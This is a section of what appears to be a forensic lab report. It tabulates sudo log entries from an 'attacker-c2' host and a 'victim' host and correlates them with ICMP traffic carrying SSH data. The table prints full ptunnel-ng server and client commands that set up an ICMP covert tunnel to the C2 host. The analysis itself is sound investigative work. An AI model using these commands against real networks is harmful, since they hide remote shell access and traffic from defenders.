# Stage 3 — Table of Significant Log Entries

| Timestamp | Source | Log Entry | Correlation |
|---|---|---|---|
| 2026-11-19 21:37:53 UTC (attacker-c2 clock, correct) | attacker-c2 — journalctl (sudo) | `sudo: attacker-c2 : COMMAND=/home/attacker-c2/ptunnel-ng/src/ptunnel-ng -r0.0.0.0 -R22` | Marks the start of C2-server availability; precedes the victim-side client launch by ~2 minutes |
| 2026-11-20 02:39:42 +05 (= 2026-11-19 21:39:42 UTC) (victim clock, correct) | victim — journalctl (sudo) | `sudo: victim : COMMAND=/home/victim/ptunnel-ng/src/ptunnel-ng -p 192.168.100.20 -l 2222 -r192.168.100.20 -R22` | Matches the client command used for the final capture in Stage 1 (Task 3); confirms the client was launched ~2 minutes after the C2 server |

## Preliminary Interpretation

System logs on both hosts confirm sudo-elevated execution of ptunnel-ng
with the exact command-line arguments used to produce the evidence
captured in Stage 1-2. No clock drift was found on either host this time
(attacker-c2 runs in UTC, victim in UTC+5/Asia-Qyzylorda - both verified
with `date`), so absolute timestamps are directly comparable after
timezone conversion. The process-level evidence (ptunnel-ng invocation,
correct order - server then client, matching arguments) directly ties
the system logs to the network-level anomaly identified in Stage 2 (the
oversized ICMP packets carrying SSH key-exchange data).